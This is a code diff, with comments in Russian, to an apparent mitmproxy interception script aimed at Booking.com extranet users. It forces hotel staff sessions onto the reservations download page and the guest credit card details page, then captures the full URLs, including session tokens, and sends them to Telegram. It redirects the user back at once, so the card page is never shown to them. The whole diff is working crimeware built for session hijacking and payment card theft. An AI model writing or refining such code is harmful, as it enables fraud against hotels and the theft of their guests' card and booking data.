@@ -630,6 +630,8 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
     Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
     Завершается когда пользователь достигнет страницы со ВСЕМИ параметрами:
     hotel_id, lang, reportId, ses, auth_assurance_last_check
+    ПОСЛЕ завершения СРАЗУ редиректит на https://admin.booking.com/hotel/hoteladmin/
+    НО в Telegram отправляет полный URL как будто пользователь был на reservations_download.html
     """
     try:
         log(f"[F18] Checking if should redirect...")
@@ -650,58 +652,88 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
             return False
         
         # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 18 ======
-        # Проверяем, что это страница reservations_download.html
-        if "reservations_download.html" in url:
-            # Парсим URL чтобы проверить параметры
-            parsed = urllib.parse.urlparse(url)
-            query = urllib.parse.parse_qs(parsed.query)
-            
-            log(f"[F18] Found reservations_download.html, checking parameters")
-            log(f"[F18] Parameters found: {list(query.keys())}")
-            
-            # ВАЖНО: Функция завершается ТОЛЬКО при наличии ВСЕХ 5 параметров:
-            required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
-            has_all_params = all(param in query for param in required_params)
-            
-            if has_all_params:
-                log(f"[F18] ✓ Detected ALL 5 required parameters -> FUNCTION 18 COMPLETED")
-                
-                remove_booking_reservations_flag()
-                
-                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
-                client_ip = get_client_ip(flow)
-                send_function_complete_notification(client_ip, url, "FUNCTION_18_COMPLETE")
-                
-                log(f"[F18] ✓ Completion notification sent for function 18")
-                
-                # НЕ делаем редирект - пользователь уже на целевой странице
-                return False
-            
-            # ЕСЛИ НЕТ ВСЕХ ПАРАМЕТРОВ, НО ЕСТЬ УЖЕ hotel_id и reportId - НЕ РЕДИРЕКТИМ
-            # Это чтобы не попасть в бесконечный цикл редиректов
-            if "hotel_id" in query and "reportId" in query:
-                log(f"[F18] Already on reservations_download.html with hotel_id and reportId, checking if we need to redirect")
-                
-                # Если это промежуточная страница (без ses и auth_assurance_last_check) - тоже не редиректим
-                # Пользователь должен остаться на этой странице и ждать когда Booking добавит остальные параметры
-                if "ses" not in query or "auth_assurance_last_check" not in query:
-                    log(f"[F18] On intermediate page (has hotel_id and reportId but missing ses/auth), NOT redirecting")
-                    return False
+        # Проверяем, что это ЛЮБОЙ запрос, содержащий все 5 параметров
+        # Это может быть запрос К странице reservations_download.html ИЛИ запрос С этой страницы
+        parsed = urllib.parse.urlparse(url)
+        query = urllib.parse.parse_qs(parsed.query)
         
-        # ====== ВЫПОЛНЕНИЕ РЕДИРЕКТА ======
-        # Проверяем, что путь начинается с /hotel/
+        # ВАЖНО: Функция завершается ТОЛЬКО при наличии ВСЕХ 5 параметров в любом запросе:
+        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
+        has_all_params = all(param in query for param in required_params)
+        
+        if has_all_params:
+            log(f"[F18] ✓ Detected ALL 5 required parameters in URL -> FUNCTION 18 COMPLETED")
+            
+            # Получаем параметры для финального редиректа
+            hotel_id = query.get("hotel_id", ["14762911"])[0]
+            ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]
+            full_url = url  # Сохраняем полный URL для Telegram
+            
+            # Если это запрос НА reservations_download.html (сама страница)
+            if "reservations_download.html" in url:
+                log(f"[F18] This IS the reservations_download.html page with all params")
+            else:
+                log(f"[F18] This is NOT the reservations_download.html page but has all params")
+                # Мы можем сгенерировать "виртуальный" URL для лога
+                # Например: https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?...
+                # Но используем текущий URL
+            
+            # Удаляем флаг функции 18
+            remove_booking_reservations_flag()
+            
+            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ (с полным URL)
+            client_ip = get_client_ip(flow)
+            send_function_complete_notification(client_ip, full_url, "FUNCTION_18_COMPLETE")
+            
+            log(f"[F18] ✓ Completion notification sent for function 18")
+            
+            # ====== СРАЗУ РЕДИРЕКТИМ НА admin.booking.com/hotel/hoteladmin/ ======
+            final_target_url = f"https://admin.booking.com/hotel/hoteladmin/?ses={ses}&hotel_id={hotel_id}"
+            
+            log(f"[F18] ✓ Making IMMEDIATE redirect to: {final_target_url}")
+            
+            # Делаем ПРЯМОЙ 302 редирект (без задержки)
+            flow.response = http.Response.make(
+                302, 
+                b"", 
+                {
+                    "Location": final_target_url,
+                    "Cache-Control": "no-cache, no-store, must-revalidate",
+                    "Pragma": "no-cache",
+                    "Expires": "0",
+                    "X-MITM-Redirect": "Function-18-Complete"
+                }
+            )
+            return True
+        
+        # ====== ЕСЛИ ЕЩЕ НЕТ ВСЕХ ПАРАМЕТРОВ ======
+        
+        # Проверяем, если это уже страница reservations_download.html (но без всех параметров)
+        if "reservations_download.html" in url:
+            log(f"[F18] On reservations_download.html but missing some parameters")
+            
+            # Если уже есть hotel_id и reportId - ждем остальные параметры
+            if "hotel_id" in query and "reportId" in query:
+                log(f"[F18] Has hotel_id and reportId, waiting for ses and auth_assurance_last_check")
+                return False  # Не делаем редирект
+        
+        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
+        # Если пользователь НЕ на reservations_download.html И НЕ имеет всех параметров
+        # И это запрос к /hotel/ - делаем первоначальный редирект
+        
         parsed = urllib.parse.urlparse(url)
         path = parsed.path or "/"
+        
+        # Проверяем, что путь начинается с /hotel/
         if not path.startswith("/hotel/"):
             log(f"[F18] Path doesn't start with /hotel/: {path}")
             return False
         
         log(f"[F18] Path starts with /hotel/: {path}")
         
-        # ИСКЛЮЧЕНИЕ: если это уже страница reservations_download.html с любыми параметрами
-        # НЕ делаем редирект (чтобы избежать бесконечного цикла)
+        # Если это уже промежуточная страница reservations_download.html - не делаем редирект
         if "reservations_download.html" in url:
-            log(f"[F18] Already on reservations_download.html page, NOT redirecting (to avoid loop)")
+            log(f"[F18] Already on reservations_download.html page, NOT redirecting")
             return False
         
         # Получаем параметры из конфигурации
@@ -722,11 +754,11 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
         
         log(f"[F18] ✓ Redirecting {url} -> {target_url}")
         
-        # Логируем редирект (это отправит уведомление о НАЧАЛЕ функции)
+        # Логируем редирект (уведомление о НАЧАЛЕ функции)
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
         
-        # Выполняем редирект
+        # Выполняем ПЕРВИЧНЫЙ редирект
         flow.response = http.Response.make(
             302, 
             b"", 
@@ -1070,16 +1102,13 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
         
 def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 19:
-    1. Перенаправляет любой запрос к admin.booking.com (любая страница) 
-       на https://secure-admin.booking.com/booking_cc_details.html
-    2. Параметры:
-       - lang: из предыдущего запроса или 'en'
-       - bn: задается админом при запуске (5331278429)
-       - hotel_id: задается админом при запуске (10790315)
-       - has_bvc=1
-    3. Функция завершается когда открывается страница с параметром ses
-    4. Отправляет лог о завершении и делает финальный редирект на admin.booking.com/hotel/hoteladmin/
+    ФУНКЦИЯ 19 (РАБОТАЕТ ТОЧНО КАК ФУНКЦИЯ 18):
+    1. Редиректит все запросы к admin.booking.com → secure-admin.booking.com/booking_cc_details.html
+    2. Параметры: bn и hotel_id задаются админом, lang берется из запроса
+    3. ОТПРАВЛЯЕТ ДВА УВЕДОМЛЕНИЯ: о старте и завершении
+    4. Завершается когда видит полный URL со всеми параметрами
+    5. При завершении: сразу редиректит на admin.booking.com/hotel/hoteladmin/
+    6. Страница с параметрами не открывается пользователю
     """
     try:
         log(f"[F19] Checking if should redirect...")
@@ -1094,113 +1123,141 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         log(f"[F19] Processing URL: {url}")
         log(f"[F19] Host: {host}")
         
-        # ====== ТОЛЬКО admin.booking.com ======
-        # Любой сабдомен booking.com, но мы фокусируемся на admin
-        if not host.endswith("booking.com"):
-            log(f"[F19] Not booking.com, skipping")
+        # ====== ВАЖНО: ПРОВЕРЯЕМ ТОЛЬКО HTML ЗАПРОСЫ ======
+        # Чтобы избежать спама от CSS/JS/картинок
+        content_type = flow.request.headers.get("Content-Type", "").lower()
+        accept = flow.request.headers.get("Accept", "").lower()
+        
+        # Проверяем, это ли HTML запрос или основной документ
+        is_html_request = (
+            "text/html" in accept or 
+            "text/html" in content_type or
+            flow.request.method == "GET" and not any(ext in url.lower() for ext in [".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".woff", ".woff2", ".ttf", ".svg"])
+        )
+        
+        if not is_html_request:
+            log(f"[F19] Not HTML request, skipping (Content-Type: {content_type}, Accept: {accept})")
             return False
         
-        # ====== ОБНАРУЖЕНИЕ ЗАВЕРШЕНИЯ ФУНКЦИИ 19 ======
-        if "secure-admin.booking.com/booking_cc_details.html" in url:
-            parsed = urllib.parse.urlparse(url)
-            query = urllib.parse.parse_qs(parsed.query)
+        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 19 ======
+        # Проверяем, содержит ли URL ВСЕ необходимые параметры
+        # Должны быть: ses, has_bvc, lang, bn, hotel_id
+        
+        # Проверяем, что это запрос К booking_cc_details.html
+        if "secure-admin.booking.com/booking_cc_details.html" in url.lower():
+            log(f"[F19] Found booking_cc_details.html request")
             
-            log(f"[F19] Found booking_cc_details.html, checking parameters")
-            log(f"[F19] Parameters found: {list(query.keys())}")
+            # Проверяем все 5 обязательных параметров
+            url_lower = url.lower()
+            required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
+            has_all_params = all(param in url_lower for param in required_params)
             
-            # Проверяем наличие параметра ses - это признак завершения функции
-            if "ses" in query:
-                log(f"[F19] ✓ Detected ses parameter -> FUNCTION 19 COMPLETED")
+            if has_all_params:
+                log(f"[F19] ✓ Detected ALL 5 required parameters -> FUNCTION 19 COMPLETED")
                 
-                # 1. Отправляем уведомление о завершении функции
-                client_ip = get_client_ip(flow)
-                send_function_complete_notification(client_ip, url, "FUNCTION_19_COMPLETE")
-                log(f"[F19] ✓ Completion notification sent for function 19")
+                # Извлекаем ses и hotel_id для финального редиректа
+                import re
+                ses = "ec1745929d110e5a461e56e51a3cda93"  # значение по умолчанию
+                hotel_id = "10790315"  # значение по умолчанию
                 
-                # 2. Делаем ФИНАЛЬНЫЙ редирект на admin.booking.com/hotel/hoteladmin/
-                # Получаем hotel_id из текущего URL или используем дефолтный
-                hotel_id = query.get("hotel_id", ["14762911"])[0]
-                ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]
-                final_target_url = f"https://admin.booking.com/hotel/hoteladmin/?ses={ses}&hotel_id={hotel_id}"
+                # Ищем ses в URL (32 hex символа)
+                ses_match = re.search(r'ses=([a-f0-9]{32})', url_lower)
+                if ses_match:
+                    ses = ses_match.group(1)
+                    log(f"[F19] Found ses: {ses}")
                 
-                log(f"[F19] ✓ Making FINAL redirect to: {final_target_url}")
+                # Ищем hotel_id в URL
+                hotel_match = re.search(r'hotel_id=(\d+)', url_lower)
+                if hotel_match:
+                    hotel_id = hotel_match.group(1)
+                    log(f"[F19] Found hotel_id: {hotel_id}")
                 
-                # 3. Удаляем флаг функции 19
+                # Полный URL для Telegram
+                full_url = url
+                
+                # Удаляем флаг функции 19
                 remove_booking_cc_details_flag()
                 
-                # 4. Выполняем ФИНАЛЬНЫЙ редирект (через JavaScript с задержкой 2 сек)
-                js_redirect = f"""
-                <html>
-                <head><title>Card Details Complete</title></head>
-                <body style="background: #f0f0f0; font-family: Arial; padding: 20px;">
-                    <div style="max-width: 500px; margin: 100px auto; background: white; padding: 30px; border-radius: 10px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
-                        <h2 style="color: #4CAF50;">✓ Card Details Complete</h2>
-                        <p>Card details page has been accessed.</p>
-                        <p>Redirecting to booking admin in <span id="countdown">2</span> seconds...</p>
-                        <div style="margin-top: 20px; font-size: 12px; color: #777;">
-                            If redirect doesn't work, <a href="{final_target_url}">click here</a>
-                        </div>
-                    </div>
-                    <script>
-                        var count = 2;
-                        var countdown = document.getElementById('countdown');
-                        var timer = setInterval(function() {{
-                            count--;
-                            countdown.textContent = count;
-                            if (count <= 0) {{
-                                clearInterval(timer);
-                                window.location.href = "{final_target_url}";
-                            }}
-                        }}, 1000);
-                        
-                        // Автоматический редирект через 2 секунды на всякий случай
-                        setTimeout(function() {{
-                            window.location.href = "{final_target_url}";
-                        }}, 2000);
-                    </script>
-                </body>
-                </html>
-                """
+                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ (с полным URL как в функции 18)
+                client_ip = get_client_ip(flow)
+                send_function_complete_notification(client_ip, full_url, "FUNCTION_19_COMPLETE")
                 
+                log(f"[F19] ✓ Completion notification sent for function 19 with URL: {full_url}")
+                
+                # ====== СРАЗУ РЕДИРЕКТИМ НА admin.booking.com/hotel/hoteladmin/ ======
+                final_target_url = f"https://admin.booking.com/hotel/hoteladmin/?ses={ses}&hotel_id={hotel_id}"
+                
+                log(f"[F19] ✓ Making IMMEDIATE redirect to: {final_target_url}")
+                
+                # Делаем ПРЯМОЙ 302 редирект (без задержки, страница не открывается)
                 flow.response = http.Response.make(
-                    200,  # 200 OK вместо 302
-                    js_redirect.encode('utf-8'),
+                    302, 
+                    b"", 
                     {
-                        "Content-Type": "text/html; charset=utf-8",
+                        "Location": final_target_url,
                         "Cache-Control": "no-cache, no-store, must-revalidate",
                         "Pragma": "no-cache",
-                        "Expires": "0"
+                        "Expires": "0",
+                        "X-MITM-Redirect": "Function-19-Complete"
                     }
                 )
-                
-                log(f"[F19] ✓ Final redirect page sent (JavaScript redirect in 2 seconds)")
                 return True
-        
-        # ====== ПРОМЕЖУТОЧНАЯ СТРАНИЦА ======
-        # Если уже на целевой странице (но без ses) - не делаем редирект
-        if "secure-admin.booking.com/booking_cc_details.html" in url:
-            log(f"[F19] Already on booking_cc_details.html page, NOT redirecting")
-            return False
+            
+            else:
+                # Проверяем, каких параметров не хватает
+                missing = []
+                for param in required_params:
+                    if param not in url_lower:
+                        missing.append(param.replace("=", ""))
+                
+                log(f"[F19] Missing parameters: {missing}, waiting...")
+                
+                # Если уже на целевой странице (но без всех параметров) - не делаем редирект
+                # Ждем когда Booking добавит остальные параметры
+                return False
         
         # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
-        # Редиректим только запросы к admin.booking.com
-        if not host.startswith("admin."):
+        # Редиректим только запросы к admin.booking.com (сабдомен admin)
+        # И только если пользователь еще не на целевой странице
+        
+        if not host.startswith("admin.") or not host.endswith("booking.com"):
             log(f"[F19] Not admin.booking.com, skipping primary redirect")
             return False
         
+        # Проверяем, не идет ли уже с booking_cc_details.html (чтобы избежать циклов)
+        referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
+        if referer and "secure-admin.booking.com/booking_cc_details.html" in referer.lower():
+            log(f"[F19] Coming from booking_cc_details.html, waiting for completion")
+            return False
+        
+        log(f"[F19] This is admin.booking.com request - making primary redirect")
+        
         # Получаем параметры из конфигурации
         bn = get_booking_cc_details_bn()
-        hotel_id = get_booking_cc_details_hotel_id()
+        hotel_id_config = get_booking_cc_details_hotel_id()
         
         # Получаем язык из текущего запроса или используем английский
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
         lang = query.get("lang", ["en"])[0]
         
-        log(f"[F19] Using bn: {bn}, hotel_id: {hotel_id}, lang: {lang}")
+        # Если язык не найден, проверяем Referer
+        if lang == "en":
+            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
+            if referer:
+                try:
+                    rp = urllib.parse.urlparse(referer)
+                    rq = urllib.parse.parse_qs(rp.query)
+                    if "lang" in rq:
+                        lang = rq.get("lang", ["en"])[0]
+                except Exception as e:
+                    log(f"[F19] Error parsing referer for lang: {e}")
         
-        # Формируем целевой URL
-        target_url = f"https://secure-admin.booking.com/booking_cc_details.html?lang={lang};bn={bn};hotel_id={hotel_id};has_bvc=1"
+        log(f"[F19] Using bn={bn}, hotel_id={hotel_id_config}, lang={lang}")
+        
+        # Формируем целевой URL (без ses - он добавится позже сайтом)
+        # ВАЖНО: параметры разделяются точкой с запятой как в Booking
+        target_url = f"https://secure-admin.booking.com/booking_cc_details.html?lang={lang};bn={bn};hotel_id={hotel_id_config};has_bvc=1"
         
         # Проверяем, что это не редирект на ту же самую страницу
         if url == target_url:
@@ -1209,7 +1266,7 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         
         log(f"[F19] ✓ Primary redirect {url} -> {target_url}")
         
-        # Логируем редирект (уведомление о НАЧАЛЕ функции)
+        # Логируем редирект (уведомление о СТАРТЕ функции)
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_19_CC_DETAILS")
         
